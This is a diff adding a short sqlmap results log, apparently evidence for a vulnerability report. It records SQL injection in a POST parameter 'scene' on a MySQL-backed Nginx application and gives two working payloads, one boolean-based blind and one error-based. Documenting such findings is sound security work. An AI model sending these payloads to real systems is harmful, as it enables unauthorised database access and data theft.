@@ -1,0 +1,13 @@
+sqlmap identified the following injection point(s) with a total of 816 HTTP(s) requests:
+---
+Parameter: scene (POST)
+    Type: boolean-based blind
+    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: limit=10&q=e&scene=1' AND EXTRACTVALUE(7492,CASE WHEN (7492=7492) THEN 7492 ELSE 0x3A END) AND 'gSMK'='gSMK
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: limit=10&q=e&scene=1' AND EXTRACTVALUE(6209,CONCAT(0x5c,0x716b6b7171,(SELECT (ELT(6209=6209,1))),0x7162706271)) AND 'Uwzn'='Uwzn
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.1
